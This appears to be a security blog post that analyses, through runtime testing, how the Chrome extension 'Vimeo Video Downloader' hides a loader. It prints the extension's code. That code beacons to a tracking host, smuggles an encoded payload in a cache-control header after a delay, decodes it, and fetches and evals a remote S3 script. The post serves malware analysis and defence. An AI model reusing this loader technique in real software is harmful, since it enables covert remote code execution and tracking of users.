---
path: "/extensions-google-chrome's-soft-underbelly-(part-2)"
date: "2021-02-07T01:02:46.816Z"
title: "Extensions: Google Chrome's Soft Underbelly (Part 2)"
description: "Dynamic code analysis of Vimeo Video Downloader reveals major security risks."
image: './blank.jpg'
tags: ['security','chrome','webdev','devops']
---

In the previous post, I mainly went through the code to understand what was going on on a syntactic level. Now that I've done some actual runs let's see what this code does.

## 2021 Update

Since my last update, it seems that I was hit with a malicious extension attack. This time, it is a prevalent extension called *The Great Suspender*. As outlined in this [Github issue](https://github.com/greatsuspender/thegreatsuspender/issues/1263), ownership of the extension was transferred to an unknown party. The new owners made some updates to the extension that were not seen in the open-source version stored on Github. This extension was also funneling your browsing behaviors to a malicious analytics page.

Some other notable extensions found with the same behavior include the following:

- [Auto Refresh Premium](https://chrome.google.com/webstore/detail/auto-refresh-premium/bjongnefdmjcapcogjnikbalachmbccp), `static.trckljanalytic.com`
- [Stream Video Downloader](https://chrome.google.com/webstore/detail/stream-video-downloader/imkngaibigegepnlckfcbecjoilcjbhf), `static.trckpath.com`
- [Custom Feed for Facebook](https://chrome.google.com/webstore/detail/custom-feed-for-facebook/kadbillinepbjlgenaliokdhejdmmlgp), `api.trackized.com`
- [Notifications for Instagram](https://chrome.google.com/webstore/detail/notifications-for-instagr/opnbmdkdflhjiclaoiiifmheknpccalb), `pc.findanalytic.com`
- [Flash Video Downloader](https://chrome.google.com/webstore/detail/flash-video-downloader/aiimdkdngfcipjohbjenkahhlhccpdbc), `static.trackivation.com`
- [Ratings Preview for YouTube](https://chrome.google.com/webstore/detail/ratings-preview-for-youtu/cgbhdenfmgbagncdmgbholejjpmmiank), `cdn.webtraanalytica.com`

And now, back to the rest of the article.

## Running the Extension

The first thing I want to see is what the extension does when I first run the browser. The code within the extension's `bg_script.js` is written as an [IIFE](https://developer.mozilla.org/en-US/docs/Glossary/IIFE), where it is executed immediately after the function is defined. 

After starting the browser, the first thing to observe is the network requests to see if it is making outbound connections to URLs that we have seen in the code. According to Chrome's inspector tool, a connection is established to `count.users-analytics.com` with some query parameters containing some identifying information as mentioned in the previous post.

![](https://raw.githubusercontent.com/Spiderpig86/blog/master/images/Extensions%20Google%20Chromes%20Soft%20Underbelly%20Part%202/ext1-pt2.PNG)

The headers are cached within the local storage. As of now, I’m not really sure what the extension is trying to achieve by storing headers into local storage. To refresh your memory, the code for storing the headers in local storage looks like this:

```js
chrome.webRequest.onCompleted.addListener(function(a) {
    a.responseHeaders.forEach(function(a) {
        a.value && a.value.length > 20 && (localStorage[a.name.toLowerCase()] = a.value)
    })
}, {
    urls: ["*://" + x[2] + "*"],
    types: ["image"]
}, ["responseHeaders"]),
```

![](https://github.com/Spiderpig86/blog/raw/master/images/Extensions%20Google%20Chromes%20Soft%20Underbelly%20Part%202/ext2-pt2.PNG)

After about 60 seconds, another request is made to the same host. The same response headers are updated in local storage. A possible explanation for this is to have a backup in case the first request failed.

```js
function t(a) {
    var b = new Image,
        c = Math.random();
    c += 1, c > 2 ? b.src = ["https://www.google-analytics.com/_utm.gif?", m(), k(), l(), i(), n(), j(a), p()].join("").replace(/&$/, "") : b.src = ["https://", x[2], g(), q(), m()].concat(s([k(), l(), i(), n(), o(), j(a), p()])).join("").replace(/&$/, "")
}

/* ------------------------------------------------- */

// Separate IIFE
setTimeout(function() {
    t(b) // b the random id
}, 6e4)
```

![](https://github.com/Spiderpig86/blog/raw/master/images/Extensions%20Google%20Chromes%20Soft%20Underbelly%20Part%202/ext3-pt2.PNG)

Looking at the stored fields in local storage, we see an interesting field called `installedTime`, which holds the UNIX timestamp of when I installed the extension. This gave me a couple of ideas, such as modifying the installed time code in the extension to see how it behaves as more time passes. The following code sets this field.

```js
window.localStorage.userSettings = "config", C(), c(),
		function() {
			"undefined" == typeof window.localStorage.installedTime && (window.localStorage.installedTime = Date.now());
			var b = "nop",
				c = "user_id";
    // ...
```

I then modified `Date.now()` to a timestamp that was six months ago and restarted the browser. This time, I see that the header field for `cache-control` contains something a little bit extra. Rather than just having the [expected values](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control) for the `cache-control` field, there is a string attached at the end of `no-cache` value:

```
no-cache,NTM2MTEzeChZb1koQTBfFX5pWRY4FFNLexxTNhogb0dlOlFFHHxoLQ1uVFlYBDJ7CHIKZ1pdWlR-eV4xVTNkIUJBMCM6K1UqFUpEEX13bVt6WRFfVjxwSD8KbjUuGx03NSFhGmBhZiExVEUUQFFbOXBUZV13LC1X
```

So why did I try modifying the date? Was it a stroke of luck? Why, no. You see, this approach of relying on the date to trigger a particular behavior isn't some newfangled strategy but rather something that dates back to the MS-DOS days. A very well known DOS virus is called [Jerusalem](https://en.wikipedia.org/wiki/Jerusalem_(computer_virus)), which infected every executable file on the system every Friday the 13th except in 1987. 

After some testing, I pinpointed that if your installation date is greater than a day from today, then the `cache-control` field will contain the extra encoded string we see above. Just looking at it, the encoded string does not mean anything, but maybe reading the code will give us some hints.

My first instinct was to look at any part of the code that used the `cache-control` key anywhere. The first snippet I found is in this function:

```js
getMediaPath: function() {
    var a = window.localStorage;
    console.trace('getMediaPath', a);
    if (a["cache-control"]) {
        var b = a["cache-control"].split(",");
        try {
            var c;
            for (var d in b) {
                var e = b[d].trim();
                if (!(e.length < 10)) try {
                    if (c = e.strvstrevsstr(), c = "undefined" != typeof JSON && JSON.parse && JSON.parse(c), c && c.cache_c) {
                        for (var f in c) window[f] = c[f];
                        A = !0;
                        break
                    }
                } catch (g) {}
            }
        } catch (g) {}
        this.setMediaPath()
    }
},
```

If the `cache-control` key exists inside local storage, then the `getMediaPath` function would split the value in `cache-control`, split it, and then call `strvstrevsstr` on the string value that is greater than length 10. We know that the split will always have 2 elements and `strvstrevsstr` will be used to decode the encoded string to a JSON object. To test, I grabbed the definition for `strvstrevsstr` and ran it in the inspector tool's console.

```js
String.prototype.strvstrevsstr = function() {
    var a = this;
    this.length % 4 != 0 && (a += "===".slice(0, 4 - this.length % 4)), a = atob(a.replace(/\-/g, "+").replace(/_/g, "/"));
    var b = parseInt(a[0] + a[1], 16),
        c = parseInt(a[2], 16);
    a = a.substr(3);
    var d = parseInt(a);
    if (a = a.substr(("" + d).length + 1), d != a.length) return null;
    for (var e = [String.fromCharCode], f = 0; f < a.length; f++) e.push(a.charCodeAt(f));
    for (var g = [], h = b, i = 0; i < e.length - 1; i++) {
        var j = e[i + 1] ^ h;
        i > c && (j ^= e[i - c + 1]), h = e[i + 1] ^ b, g.push(e[0](j))
    }
    return g.join("");
}
```

For the `strvstrevsstr` function, I'm not too sure if it is worth going too much into detail of what it does. Basically, the only thing we need to know is that it does quite a bit of string manipulation to decode the string to the JSON object we see below.

```js
"NTM2MTEzeChZb1koQTBfFX5pWRY4FFNLexxTNhogb0dlOlFFHHxoLQ1uVFlYBDJ7CHIKZ1pdWlR-eV4xVTNkIUJBMCM6K1UqFUpEEX13bVt6WRFfVjxwSD8KbjUuGx03NSFhGmBhZiExVEUUQFFbOXBUZV13LC1X".strvstrevsstr() // => {"ee":"eval","jj":"$","gg":"get","uu":"https:\/\/s3.amazonaws.com\/g-js\/6afj7be259a48.js?r=12345","cache_c":"1"}
```

```JSON
{
   "ee":"eval",
   "jj":"$",
   "gg":"get",
   "uu":"https:\/\/s3.amazonaws.com\/g-js\/6afj7be259a48.js?r=12345",
   "cache_c":"1"
}
```

What a strange thing to send to the client. The attacker utilizes the `cache-control` field as a mechanism to transfer a malicious JSON object. Unless we perform some special filtering on the response header that we receive from our requests, this is pretty hard to detect without manual analysis of the code and the network requests coming through.

Once we have this JSON object, each key-value pair is stored in the `window` object.

![](https://github.com/Spiderpig86/blog/raw/master/images/Extensions%20Google%20Chromes%20Soft%20Underbelly%20Part%202/ext4.PNG)

![](https://github.com/Spiderpig86/blog/raw/master/images/Extensions%20Google%20Chromes%20Soft%20Underbelly%20Part%202/ext5.PNG)

​```js
// getMediaPath (snippet from above)
if (c = e.strvstrevsstr(), c = "undefined" != typeof JSON && JSON.parse && JSON.parse(c), c && c.cache_c) {
    for (var f in c) window[f] = c[f];
    A = !0; // A becomes true
    break
}
```

Finally, the `setMediaPath` function is called. The malicious script is fetched from that S3 URL and then stored within local storage with the key `cfg_audio_id`. The reason why this key, in particular, is chosen is not certain, as search results yielded no information. Most likely, it was just some randomly chosen key.

```js
setMediaPath: function() {
    "undefined" != typeof jj && jj && uu && gg > jj && window[jj][gg](uu, function(a) {
        var b = "cfg_audio_id";
        localStorage[b] = a
    })
}
```

After `getMediaPath` has assigned the JSON object's contents to the window, `setMediaPath` is called to execute an AJAX call to fetch the contents of the script in S3 and storing it in local storage. Before fetching whatever is stored in S3, the script performs checks to ensure that the window variables `jj` and `uu` are defined (jQuery and S3 URL, respectively). I'll be honest and say that I'm not quite sure `gg > jj` is for anything other than doing some fuzzy validation to ensure these variables were not tampered.

In actuality, the code that is executed in `setMediaPath` is really this:

```js
setMediaPath: function() {
    "undefined" != typeof '$' && '$' && 'https://...' && 'get' > '$' && window['$']['get']('https://...', function(a) {
        var b = "cfg_audio_id";
        localStorage[b] = a
    })
}
```

So what is going on here? In `getMediaPath`, the code is taking advantage of what you can do with JavaScript, which is to store a string representation of tokens (or code) and then execute them. For example:

```js
let test = {
    "c": "console",
    "l": "log"
};
for (const key in test) { window[key] = test[key]; }

window[c][l]('test'); // Prints out 'test'
```

This feature, called [property accessors](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Property_Accessors), allows anyone to reference functions by their name from a given object. The code the attacker works here since the jQuery library is initialized at the beginning when the browser loads, defining the `$` object to be accessed at any time.

----

Let's take a step back and analyze how the functions I described above fit into the whole situation since I've only been focusing on the specifics above and the order I was investigating the functions.

To start, the line that triggers all of this to happen in the first place is when an event listener is attached to monitor when tabs are updated when the extension is first loaded. `A` is defined as the flag that dictates if we have executed the malicious S3 script yet.

```js
A = !1

// ...

chrome.tabs.onUpdated.addListener(e);
```

`e` is the function Chrome will fire whenever a tab gets updated (title change, address, change, etc.).

```js
function e(a, b, c) {
    b.url && (b.url.indexOf("vimeo.com") > -1 && chrome.tabs.sendMessage(a, "url_changed");
              
    A || (setTimeout(function() {
        D.findDetails();
    }, 1500), B.getMediaPath()))
    
    // ABOVE REWRITTEN
    /*
    	if (!A) {
    		setTimeout(function() {
    			D.findDetails();
    		}, 1500);
    		B.getMediaPath();
    	}
    */
}
```

The line to focus on here is when `setTimeout` is called. If `A` is false, meaning we have not executed the malicious script from S3 yet, then the extension would to first call `getMediaPath` and then execute `findDetails` `1500ms` later. If you recall from before, `getMediaPath` decodes the string attached in `cache-control` and then constructs a JSON object that contains the tokens needed to perform an AJAX call to get the malicious S3 script. `A` is then set to true in `getMediaPath`. This disables the script from rerunning the malicious script whenever any tab gets updated.

Assuming that step completes in `1500ms`, then `findDetails` executes the S3 script itself. The S3 script itself remains a mystery (more on this later).

```js
findDetails: function() {
    if ("undefined" != typeof ee) {
        var a = "cfg_audio_id";
        localStorage[a] && window[ee](localStorage[a]);
        delete localStorage[a]
    }
}
```

## Summary

What was described was pretty confusing, so I will try my best to summarize this.

The process of pinging `counter.users-analytics.com` to calling `setMediaPath` happens all at once right when the browser starts up. All necessary libraries and function calls are made to set up the environment for the extension to work, including its malicious behavior. All this described above happens within the extension page itself (background HTML file for extension).

Below is a diagram that describes the order of events that the script fires.

![](https://github.com/Spiderpig86/blog/raw/master/images/Extensions%20Google%20Chromes%20Soft%20Underbelly%20Part%202/Extensions%20Part%202.png)

## What's Next

In the next and probably last section, I will focus on what is in `6afj7be259a48.js`, the file downloaded from Amazon S3. The file is obfuscated quite heavily, but we can still manage to figure out a little bit of what it does. As a brief preview, I was able to see that it sends information to another domain called `offset.under-box.com`, but more research needs to be done.

